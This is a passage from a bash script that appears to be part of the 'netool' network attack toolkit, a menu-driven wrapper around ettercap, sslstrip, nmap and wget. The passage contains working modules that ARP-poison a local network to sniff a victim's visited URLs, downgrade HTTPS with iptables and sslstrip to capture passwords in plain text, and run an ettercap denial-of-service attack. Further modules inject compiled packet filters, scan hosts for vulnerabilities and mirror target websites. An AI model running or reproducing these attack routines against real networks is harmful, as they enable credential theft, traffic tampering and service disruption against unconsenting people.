   echo ${YellowF}' |'  to sniff URLs visited by the target machine on is browser-surfing ${Reset};
   echo ${YellowF}' |_'  ${GreenF}[ ETTERCAP ] installation found...${Reset};
   echo ""

else

   Colors;
   echo ${RedF}[x]:this script require ettercap installed to work${Reset};
   echo "[!] {opcional} Downloading from network..."
      sleep 4
      apt-get install ettercap-gtk
fi

   # chose to run  or to leave to main menu
   read -p "[+]:{run|quit}(choise):" pass
   if test "$pass" = "run"

then

   Colors;
   interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read targ
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read rou
   echo ""
   echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
   echo ${BlueF}[*]${RedF}:${BlueF}PRESS {SPACE} TO SEE ALL PACKETS TRAVELING ON THE LOCAL NETWORK${Reset};
   echo ${BlueF}[*]${RedF}:${BlueF}IF YOU WANT TO CATCH ONLY THE URLs VISITED, DONT PRESS ANYTHING${Reset};
   sleep 3
   xterm -T "netool - ettecap snnifing URL's" -geometry 110x23 -e "ettercap -T -Q -i $interface -P remote_browser -M arp /$rou// /$targ//" > /dev/null 2>&1

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}










# -----------------------------------
# using sslstrip and ettercap to sniff target passwords (local lan)
# -----------------------------------
sh_sslstrip () {
Colors;
echo ${RedF}[x]:[warning]:${GreenF}advanced module, 'read' Info first. ${Reset}

   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  SSLSTRIP module uses [ettercap + sslstrip + iptables] to downgrade${Reset};
   echo ${YellowF}' |'  one HTTPS session to HTTP enablling the capture of passwords 'in' plain${Reset};
   echo ${YellowF}' |_' text also this module builds a session.pcap 'file' [wireshark]${Reset};
   echo ""

   # chose to run  or to leave to main menu
   read -p "[+]:{run|quit}(choise):" pass
   if test "$pass" = "run"

then

   sh_raip

else

   Colors;
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}

sh_raip () {
Colors;

   cd ~/opensource/sslstrip-0.9
   if [ -e $confSSL ]; then
   echo ${GreenF}[!]${RedF}:${GreenF}SSLSTRIP installation found...${Reset};

else

   Colors;
   echo ${RedF}[x]:this script require sslstrip installed to work${Reset};
   echo ""
   echo ${CyanF}[+]${RedF}:{wait}:check dependencies ...${Reset};
      apt-get install python-twisted-web
      sleep 3
      echo ${CyanF}[+]${RedF}:{wait}:installing sslstrip ...${Reset};
      cd ~/opensource/sslstrip-0.9
      python setup.py build & python setup.py install
      sleep 3
      echo ${RedF}[x]:{sslstrip.py}:installed...  RESTARTING:{netool.sh}${Reset};
      echo ""
      touch ~/opensource/sslstrip-0.9/installed
      sleep 3
exit
fi



cat << !


 _______  _______  ___      _______  _______  ______    ___   _______
|       ||       ||   |    |       ||       ||    _ |  |   | |       |
|  _____||  _____||   |    |  _____||_     _||   | ||  |   | |    _  |
| |_____ | |_____ |   |    | |_____   |   |  |   |_||_ |   | |   |_| |
|_____  ||_____  ||   |___ |_____  |  |   |  |    __  ||   | |    ___|
 _____| | _____| ||       | _____| |  |   |  |   |  | ||   | |   |
|_______||_______||_______||_______|  |___|  |___|  |_||___| |___|

!
Colors;

   echo ${BlueF}[*]${RedF}:${BlueF}[${GreenF} logs stored: $H0m3/opensource/logs ${BlueF}]${Reset};
   interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
   SESSION=$(zenity --title="NAME LOGFOLDER" --text "input random name" --entry --width 300) > /dev/null 2>&1
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read ROUTER
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read VICTIM


      sleep 1
      # ip fowarding 
      iptables --flush
      iptables --table nat --flush
      iptables --delete-chain
      iptables --table nat --delete-chain
      sleep 1
      echo "1" > /proc/sys/net/ipv4/ip_forward
      iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

   cd ~/opensource/sslstrip-0.9
   ./sslstrip.py -p -w ~/opensource/logs/$SESSION.log -l 10000 &
   ettercap -T -q -i $interface -w ~/opensource/logs/$SESSION.pcap -L ~/opensource/logs/$SESSION -M arp /$ROUTER// /$VICTIM//
   killall sslstrip
   killall python
   iptables --flush
   iptables --table nat --flush
   iptables --delete-chain
   iptables --table nat --delete-chain
      # reset ip-forward
      echo "0" > /proc/sys/net/ipv4/ip_forward
      Colors;
      echo ""
      echo ${BlueF}[+]${RedF}:${BlueF}[${YellowF} editing sslstrip session log File ${BlueF}]${Reset};
      sleep 4
      xterm -T "Sslstrip session log" -e "nano ~/opensource/logs/$SESSION.log"
      cd ~/
      clear
}









# -----------------------------------
# dos attack to target inside local network
# -----------------------------------
sh_dos () {
Colors;

   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module uses ettercap arp poison {MITM} and etter.filters${Reset};
   echo ${YellowF}' |_'  to launch a DoS attack against a target inside the localnetwork ${Reset};
   echo ""

   # chose to run  or to leave to main menu
   read -p "[+]:{run|quit}(choise):" pass
   if test "$pass" = "run"

then

sh_fuckup

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}

sh_fuckup () {
   if [ -d $find2 ]; then
   Colors;
   echo ${GreenF}[!]${RedF}:${GreenF}ETTERCAP installation found...${Reset};

else

   Colors;
   echo ${RedF}[x]:this script require ettercap installed to work${Reset};
   echo "[!] {opcional} Downloading from network..."
   sleep 4
   apt-get install ettercap-gtk
fi

      interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
      echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
      echo ${GreenF}[~]${RedF}:${GreenF}copy [unused IP] to decoy scans ${Reset};
      sleep 2
      ettercap -T -Q -i $interface -P find_ip -M arp /// /// | grep "find_ip:" | awk '{print}'
      echo ""
      echo "* |==================================================>|"
      sleep 1
      ettercap -T -Q -i $interface -P dos_attack -M arp /// ///
      echo ""
      echo ""
}










# -----------------------------------
# Compile etter.filters
# -----------------------------------
sh_comp () {
Colors;
echo ${RedF}[x]:[warning]:${GreenF}advanced module, 'read' Info first. ${Reset};

   echo ${YellowF}"  _"
   echo ${YellowF}' |'  This module edit/compile ettercap filters to capture TCP/IP packets${Reset};
   echo ${YellowF}' |'  change the contents of the packet and send it back to the target${Reset};
   echo ${YellowF}' |'  that have requested the packet previous [compile from filter.eft to filter.ef]${Reset};
   echo ${YellowF}' |_'  'more info' here:${GreenF}http://www.101hacker.com/2011/05/fun-with-ettercap-filters.html${Reset};
   echo ""

   # chose to run  or to leave to main menu
   read -p "[+]:{run|quit}(choise):" pass
   if test "$pass" = "run"

then

sh_fuckip

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}

sh_fuckip () {
   echo ""
   echo ""
   echo ${CyanF}[+]${RedF}:${GreenF}1. chose to edit a filter by is name... ${Reset};
   echo ${CyanF}[+]${RedF}:${GreenF}2. then save the filter with the name [filter.eft] ${Reset};
   echo ""
   echo ""
      cd $find2 && ls -l
         echo ""
         echo ""
         echo -n "[+]:(edit filter):"
         read compfil
         clear
         echo ""
         echo ${CyanF}[+]${RedF}:${GreenF}REMENBER TO SAVE THE FILTER THAT YOU ARE ABOUT TO EDIT${Reset};
         echo ${CyanF}[+]${RedF}:${GreenF}WITH THE NAME {filter.eft} FOR LATER USE IN OPTION {18} ${Reset};
         sleep 6
         nano $compfil

   # chose to compile filter or to leave to main menu
   read -p "[+]:{compile|quit}(choise):" pass
   if test "$pass" = "compile"

then

   echo -n "[+]:{filter.eft}(enter filter name to compile):"
   read rrr
      Colors;
      echo ${GreenF}[!]${RedF}:${GreenF}{please wait} compiling filter...${Reset};
      echo ""
      echo ""
      sleep 2
      etterfilter $rrr -o filter.ef
      echo ""
      Colors;
      echo ${YellowF}===============================================================${Reset};
      echo ${GreenF}[!] NOW THIS SCRIPT CAN BEE LAUNCH IN THE MAIN MENU {choise 18}${Reset};
      echo ${GreenF}[=] WARNING: ${YellowF}AFTER COMPILED THE FILENAME NOW IS:${GreenF}{filter.ef}${Reset};
      echo ${YellowF}===============================================================${Reset};
      echo ""
   cd /root
   sleep 2

else

   Colors;
   echo ${GreenF}[!]${RedF}:${GreenF}exiting compiler editor...${Reset};
   echo ""
   echo ""
   sleep 2
   clear
fi
}









# -----------------------------------
# execute a filter {previous compiled} in local network or against a target {local network}
# -----------------------------------
sh_lunch () {
Colors;
echo ${RedF}[x]:[warning]:${GreenF}advanced module, 'read' Info first. ${Reset}

   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module launches ettercap filters againts a target [filter.ef]${Reset};
   echo ${YellowF}' |_' 'more info' here:${GreenF}http://www.101hacker.com/2011/05/fun-with-ettercap-filters.html${Reset};
   echo ""

   # chose to run  or to leave to main menu
   read -p "[+]:{run|quit}(choise):" pass
   if test "$pass" = "run"

then

sh_hello

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}

sh_hello () {
   if [ -d $find2 ]; then
   Colors;
   echo ${GreenF}[!]${RedF}:${GreenF}ETTERCAP installation found...${Reset};

else

   Colors;
   echo ${RedF}[x]:this script require ettercap installed to work${Reset};
   echo "[!] {opcional} Downloading from network..."
      sleep 4
      apt-get install ettercap-gtk
fi

   interface=$(zenity --title="Input INTERFACE IN USE" --text "example: wlan0 or eth0" --entry --width 300) > /dev/null 2>&1
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read targ
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read rou
      Colors;
      echo ${RedF}[x]:[WARNING]: ${GreenF}IF YOU HAVE COMPILED THE FILTER WITH THIS SCRIPT {choise 17} THE FILTER NAME TO LAUNCH IS:${RedF}{filter.ef}${Reset};
      echo -n "[+]:{filter.ef}(launch filter name):"
      read filname
      Colors;
      echo ${RedF}[x]:Press {q} to quit ettercap${Reset};
      echo ""
      sleep 2
      ettercap -T -Q -i $interface -F $find2/$filname -M arp /$rou// /$targ//
      echo ""
}









# -----------------------------------
# retrieve metadata from target website
# -----------------------------------
sh_retrieve () {
Colors;
   echo ${GreenF}[!]${RedF}:${GreenF}WGET installation found...${Reset};
   echo ${YellowF}"  _"
   echo ${YellowF}' |'  this module can download pictures,docs,pdf,etc from a target website ${Reset};
   echo ${YellowF}' |'  or 'if' we chose a domain,it will download the all website to a folder ${Reset};
   echo ${YellowF}' |_'  just paste the URL or DOMAIN and 'wget' will downloaded it 'for' you ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   sh_getmenu

else

   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   clear
fi
}









# -----------------------------------
# another wget scans
# -----------------------------------
sh_getmenu () {
clear
cat << !

 +-------------------------------------------------------------------+ 
 |                       _              _       _                    |
 |         _ _ _ ___ ___| |_    ___ ___| |_ ___|_|_ _ ___ ___        |
 |        | | | | . | -_|  _|  |  _| -_|  _|  _| | | | -_|  _|       |
 |        |_____|_  |___|_|    |_| |___|_| |_| |_|\_/|___|_|         |
 |              |___|'clonning webpages'                             |
 +-------------------------------------------------------------------+

    1 - Download all website           {www.target.com}
    2 - download (user-agent decoy)    {Mozilla/5.0 X11; U; Linux i686}
    3 - Download only this file types  {.pdf .doc .jpg OR .txt,.html,.php}
  _
 | m - main menu
 |_q - exit script

!
echo ${RedF}'_'${Reset};
echo -n "[>]:(Your choice?):"
read choice
case $choice in
1) sh_get1 ;;
2) sh_get2 ;;
3) sh_get3 ;;
4) sh_get4 ;;
m) sh_MAIN ;;
M) sh_MAIN ;;
q) sh_exit ;;
*) echo "\"$choice\" is not a valid choise"; clear; sleep 2 ;;
esac
}







sh_get1 () {
Colors;

   # download website or just a url path or a file
   echo ${CyanF}[+]${RedF}:${YellowF}download all website: www.target.com ${Reset};
   echo ${CyanF}[+]${RedF}:${YellowF}download just a page: www.target.com/page ${Reset};
   echo ${CyanF}[+]${RedF}:${YellowF}download just a file: www.target.com/page/image.jpg ${Reset};
   wgeturl=$(zenity --title="enter target URL" --text "example: www.youporn.com" --entry --width 300) > /dev/null 2>&1

      echo ""
      echo ${BlueF}[*]${RedF}:${BlueF}retriving metadata from target ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}stored under '->' $H0m3/opensource/${YellowF}$wgeturl ${Reset};
      echo ${RedF}[x]:PRESS {ctrl+c} to quit retriving ${Reset};
      sleep 4
      cd $H0m3/opensource
      xterm -T "wget - Retrieve metadata" -geometry 110x23 -e "wget -U Mozilla -m $wgeturl" > /dev/null 2>&1
      chown -R $usera $H0m3/opensource/$wgeturl > /dev/null 2>&1
      sleep 3
   sh_getmenu
}




sh_get2 () {
Colors;

   # download website using decoys (http user-agent)
   echo ${CyanF}[+]${RedF}:${YellowF}download all website using decoys [http mozila-linux user-agent] ${Reset};
   wgeturl=$(zenity --title="enter target URL" --text "example: www.youporn.com" --entry --width 300) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}stored under '->' $H0m3/opensource/${YellowF}$wgeturl ${Reset};

      echo ""
      echo ${RedF}[x]:PRESS {ctrl+c} to quit retriving ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}retriving metadata from target ${Reset};
      sleep 4
      cd $H0m3/opensource
      xterm -T "wget - Retrieve metadata" -geometry 110x23 -e "wget --user-agent='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3' -m $wgeturl" > /dev/null 2>&1
      chown -R $usera $H0m3/opensource/$wgeturl > /dev/null 2>&1
      sleep 3
   sh_getmenu
}







sh_get3 () {
Colors;

   # download file types from target website
   wgeturl=$(zenity --title="enter target URL" --text "example: www.youporn.com" --entry --width 300) > /dev/null 2>&1
   ftype=$(zenity --title="download file type" --text "example: .pdf .doc .txt .html OR .png,.jpg" --entry --width 300) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}stored under '->' $H0m3/opensource/${YellowF}wget-capture ${Reset};

      sleep 4
      mkdir $H0m3/opensource/wget-capture > /dev/null 2>&1
      cd $H0m3/opensource/wget-capture > /dev/null 2>&1
      xterm -T "wget - Retrieve metadata" -geometry 110x23 -e "wget --user-agent='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3' -nd -m -r -A$ftype $wgeturl" > /dev/null 2>&1
      chown -R $usera $H0m3/opensource/wget-capture > /dev/null 2>&1
      cd $H0m3/opensource/ > /dev/null 2>&1
      sleep 3
   sh_getmenu
}







# -----------------------------------
# script priv8.sh [rootsector private exploits]
# -----------------------------------
sh_priv8 () {
Colors;

      # check if priv8.sh installation exists
      cd ~/opensource
      if [ -e $priv8 ]; then
      echo ${BlueF}[*]${RedF}:${BlueF}[priv8.sh]:${white}installation found...${Reset};
      sleep 1
      cd ~/opensource/modules && ./priv8.sh
      cd ..
      sh_MAIN

else

   Colors;
   echo ${RedF}[x]:[warning]: this module require [priv8.sh] installed to work ${Reset};
   sleep 4
   cd ..
   sh_MAIN
fi
}











# ----------------------------------
# webcrawler INURLBR.php by cleiton
# ----------------------------------
sh_driscanner () {
Colors;
# variable declarations
is=`which curl`
eees=`echo ~`


   # check if inurlbr script its installed
   if [ -e /usr/bin/inurlbr.php ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[inurlbr]${RedF}:${GreenF}[ FOUND ]${Reset};
   # copy the scanner in case of a new update (-u update)
   cd ~/opensource/INURLBR > /dev/null 2>&1
   chmod +x inurlbr.php
   cp inurlbr.php /usr/bin/inurlbr.php

else

   # not found dependencies = install
   echo ${RedF}'_'${Reset};
   echo ${RedF}[x]:[inurlbr]:[ NOT FOUND ] ${Reset};
   cd ~/opensource/INURLBR > /dev/null 2>&1
   chmod +x inurlbr.php
   cp inurlbr.php /usr/bin/inurlbr.php
   echo ${BlueF}[*]${RedF}:${BlueF}[inurlbr]${RedF}:${GreenF}[ Copy to '->' '/usr/bin' ]${Reset};
fi
sleep 1


   # check if dependencies are installed (php5 and curl)
   if [ -e $is ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[curl]${RedF}:${GreenF}[ FOUND ]${Reset};
   sleep 1
   if [ -e $phpins ]; then
   echo ${BlueF}[*]${RedF}:${BlueF}[php5]${RedF}:${GreenF}[ FOUND ]${Reset};
   sleep 1

else

   # not found dependencies = install
   echo ${RedF}[x]:[missing dependencies]:${white}curl${RedF}:${white}php5${RedF}:'not found'...  ${Reset};
   echo ${RedF}[x]:[installing]:${white} curl':'libcurl3':'libcurl3-dev':'php5':'php5-curl':'php5-cli':' ${Reset};
   sleep 3
   echo ""
   xterm -T "Installing dependencies" -e "apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl"
   /etc/init.d/apache2 restart > /dev/null 2>&1
zenity --title="GOOGLEINURL BRASIL 1.0.1" --text "\n  -:[ All Dependencies Installed ]:-" --width 300 --info > /dev/null 2>&1
 fi
fi




# executing inurlbr.php previous installed
cat << !

   
 ██╗███╗   ██╗██╗   ██╗██████╗ ██╗     ██████╗ ██████╗ 
 ██║████╗  ██║██║   ██║██╔══██╗██║     ██╔══██╗██╔══██╗
 ██║██╔██╗ ██║██║   ██║██████╔╝██║     ██████╔╝██████╔╝
 ██║██║╚██╗██║██║   ██║██╔══██╗██║     ██╔══██╗██╔══██╗
 ██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║  ██║
 ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝

 0xGRUPO GOOGLEINURL BRASIL - PESQUISA AVANÇADA.
 0xSCRIPT NAME : INURLBR
 0xAUTOR       : Cleiton Pinheiro
 0xNick        : Googleinurl
 0xBlog        : http://blog.inurl.com.br
 0xtwitter     : /@googleinurl
 0xfacebook    : /InurlBrasil
 0xVersão      : 1.0.1

!

   QuE=$(zenity --question --title "GOOGLEINURL BRASIL 1.0.1" --text "\n  -:[ EXECUTE SCANNER INURLBR ? ]:-") > /dev/null 2>&1
   if [ "$?" -eq "0" ]; then
   # store logs in netool toolkit logfolder
   cd ~/opensource/logs
   sleep 1
   sh_running

else

   echo ${RedF}[x]:[QUITTING]${RedF}:${white}INURLBR${RedF}:${white}SCANNER... ${Reset};
   sleep 2
   clear
   cd ~/
   sh_MAIN

fi
}


sh_running () {
Colors;
   # scanner help screen
   inurlbr.php --help
   echo "" && echo ""
   echo ${RedF}'_'${Reset};
   echo ${BlueF}[*]${RedF}:${GreenF}[ SCANNER INURLBR ]${RedF}:${Reset};
SIC=$(zenity --entry --title "GOOGLEINURL BRASIL 1.0.1" --text "\n0xEnter Command to Execute :" --width 900) > /dev/null 2>&1
gnome-terminal -t "SCANNER INURLBR (by cleiton) - [ctrl+c] to abort scanning" --geometry=148x28 --zoom=0.8 -e "$SIC" > /dev/null 2>&1

     # run scanner again?
     QuE=$(zenity --question --title "GOOGLEINURL BRASIL 1.0.1" --text "\n   -:[ RUN SCANNER AGAIN ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       clear
       sh_running

else

   echo ${RedF}[x]:[QUITTING]${RedF}:${white}INURLBR${RedF}:${white}SCANNER... ${Reset};
   zenity --title="GOOGLEINURL BRASIL 1.0.1" --text "Check your logfiles:\n/opensource/logs" --width 380 --info > /dev/null 2>&1
   clear
   cd ~/
   sh_MAIN

fi
}









sh_grab () {
Colors;

# grab network interface
InT3R=`netstat -r | grep "default" | awk {'print $8'}`
QuE=$(zenity --question --title "INTERFACE IN USE?" --text "-:[ $InT3R ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       inter="$InT3R"
       sh_2menu # goto nmap menu

else

  # interface grab aborted by user
  zenity --info --title="INTERFACE -> ABORTED" --text "Please check your network connection\nor manually input your interface in use" --width 350 > /dev/null 2>&1
  echo ${GreenF}[*]${RedF}:${GreenF}[Available Network Interfaces]: ${Reset};
  echo ""
  netstat -i | grep "wlan"  & netstat -i | grep "eth"  & netstat -i | grep "ppp"  & netstat -i | grep "vboxnet"  & netstat -i | grep "pan" & netstat -i | grep "vmnet" & netstat -i | grep "lo" > interfaces.log
  cat interfaces.log
  echo ""
  inter=$(zenity --title="Input interface in use" --text "example: wlan0 OR eth0" --entry --width 300) > /dev/null 2>&1
  sh_2menu # goto nmap menu
fi
}










# -----------------------------------
# nmap scanner menu
# -----------------------------------
sh_2menu () {
clear
cat << !

 +----------------------------------------------------------------+
 |        ___ _____ ___ ___    ___ ___ ___ ___ ___ ___ ___        |
 |       |   |     | .'| . |  |_ -|  _| .'|   |   | -_|  _|       |
 |       |_|_|_|_|_|__,|  _|  |___|___|__,|_|_|_|_|___|_|         |
 |                     |_|'scan remote targets'                   |
 +----------------------------------------------------------------+

    1  - ping target                   14 - Nse vuln modules
    2  - Show my Ip address            15 - Nse Discovery modules
    3  - See/Change Mac Adress         16 - stealth scan (evade IDS)
    4  - Change manualy Mac addr
    5  - change my hostname
    6  - Scan Local network
    7  - Scan WAN for hosts
    8  - Scan List of targets
    9  - Scan remote host for vulns
    10 - execute Nmap command
    11 - target geolocation
    12 - ping-of-dead (ICMP)
    13 - Norse (cyber attacks map)
  _
 |  m - main menu
 | db - t00lkit database
 |_ q - exit script

!
echo ${RedF}'_'${Reset};
echo -n "[>]:(Your choice?):"
read choice
case $choice in
1) sh_ping ;;
2) sh_ip ;;
3) sh_macchan ;;
4) sh_manuall ;;
5) sh_hostname ;;
6) sh_range ;;
7) sh_extlan ;;
8) sh_nlist ;;
9) sh_Smoke ;;
10) sh_nmc ;;
11) sh_geo ;;
12) sh_dead ;;
13) sh_norse ;;
14) sh_vuln ;;
15) sh_disc ;;
16) sh_stealth ;;
m) sh_MAIN ;;
M) sh_MAIN ;;
q) sh_exit ;;
db) sh_database ;;
*) echo "\"$choice\" is not a valid choise"; sleep 2 ; sh_2menu ;;
esac
}



sh_norse () {
Colors;
echo ${BlueF}[*]${RedF}:[${GreenF} ACCESSING ${RedF}]: http://map.ipviking.com/ ${Reset};
su $usera -c "xdg-open http://map.ipviking.com/" > /dev/null 2>&1
sleep 1
clear
sh_2menu
}










# -----------------------------------
# Scan remote hosts using --script "vuln"
# -----------------------------------
sh_vuln () {
Colors;

   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module scans a target using Nmap NSE script${Reset};
   echo ${YellowF}' |'  engine '(all vuln modules)' We can scan ports In 2 ways${Reset};
   echo ${YellowF}' |'  [${GreenF} 80,135,445 ${YellowF}] OR [${GreenF} 1-1000 ${YellowF}] ${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/vuln.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   ipscan=$(zenity --title="TARGET IP ADDR" --text "example: 192.168.1.69" --width 300 --entry) > /dev/null 2>&1
   PORT=$(zenity --title="PORTS TO SEARCH" --text "example: 80,139,445 OR 1-1000" --width 300 --entry) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   echo "" > ~/opensource/logs/vuln.log
   nmap -sS -p $PORT --open --script vuln -oN ~/opensource/logs/vuln.log $ipscan | zenity --progress --pulsate --title "NMAP NSE SCAN" --text="LOGFILE: vuln.log\nTARGET: $ipscan PORT: $PORT" --percentage=0 --auto-close > /dev/null 2>&1
   cat ~/opensource/logs/vuln.log | zenity --title "NMAP NSE REPORT" --text-info --width 530 --height 300 > /dev/null 2>&1
   chown $usera ~/opensource/logs/vuln.log > /dev/null 2>&1
   sleep 1
   sh_hdtt

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_hdtt () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 180) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/vuln.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/vuln.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$mad" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean with\nnew Append" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}










# -----------------------------------
# Scan remote hosts using --script "discovery"
# -----------------------------------
sh_disc () {
Colors;

   echo ${YellowF}'  _'${Reset};
   echo ${YellowF}' |'  This module scans a target using Nmap NSE script${Reset};
   echo ${YellowF}' |'  engine '(all discovery modules)' We can scan ports${Reset};
   echo ${YellowF}' |'  In 2 ways [${GreenF} 80,135,445 ${YellowF}] OR [${GreenF} 1-1000 ${YellowF}] ${Reset};
   echo ${YellowF}' |_'${RedF} LOGFILE:${white} opensource/logs/discovery.log ${Reset};
   echo ""

      # chose to run  or to leave to main menu
      read -p "[+]:{run|quit}(choise):" pass
      if test "$pass" = "run"

then

   ipscan=$(zenity --title="TARGET IP ADDR" --text "example: 192.168.1.69" --width 300 --entry) > /dev/null 2>&1
   PORT=$(zenity --title="PORTS TO SEARCH" --text "example: 80,139,445 OR 1-1000" --width 300 --entry) > /dev/null 2>&1
   echo ${BlueF}[*]${RedF}:${BlueF}[Please wait]${RedF}:${GreenF}[ RUNING SCANS ] ${Reset};
   echo "" > ~/opensource/logs/discovery.log
   nmap -sS -p $PORT --open --script discovery -oN ~/opensource/logs/discovery.log $ipscan | zenity --progress --pulsate --title "NMAP NSE SCAN" --text="LOGFILE: discovery.log\nTARGET: $ipscan PORT: $PORT" --percentage=0 --auto-close > /dev/null 2>&1
   cat ~/opensource/logs/discovery.log | zenity --title "NMAP NSE REPORT" --text-info --width 530 --height 300 > /dev/null 2>&1
   chown $usera ~/opensource/logs/discovery.log > /dev/null 2>&1
   sleep 1
   sh_hdtt2

else

   Colors;
   echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
   sleep 2
   sh_2menu
fi
}


sh_hdtt2 () {
Colors;

   # store scans in database?
   dbt=$(zenity --list --title "T00LKIT DATABASE" --text "Store recent scan on t00lkit database?" --radiolist --column "Pick" --column "Option" TRUE "Append scan to DataBase" FALSE "Clear Database and Append scan" FALSE "Clear Database and manually input" --width 330 --height 180) > /dev/null 2>&1


     if [ "$dbt" = "Append scan to DataBase" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/discovery.log`
       echo "" >> $H0m3/opensource/modules/database.db
       echo "" >> $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Scan Appended to DataBase" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and Append scan" ]; then
       dtr=`date`
       fill=`cat $H0m3/opensource/logs/discovery.log`
       echo "" > $H0m3/opensource/modules/database.db
       echo "|[ $dtr ]|" >> $H0m3/opensource/modules/database.db
       echo "$fill" >> $H0m3/opensource/modules/database.db
       zenity --info --title="T00LKIT DATABASE" --text "Database clean and\nnew scan Appended" --width 300 > /dev/null 2>&1
       chown $usera $H0m3/opensource/modules/database.db > /dev/null 2>&1
       sh_2menu


     elif [ "$dbt" = "Clear Database and manually input" ]; then
       dtr=`date`
       mad=$(zenity --title="INPUT TARGET TO DATABASE" --text "You can input TARGET-IP, NOTES , ETC..." --entry --width 300) > /dev/null 2>&1
       echo "" > $H0m3/opensource/modules/database.db
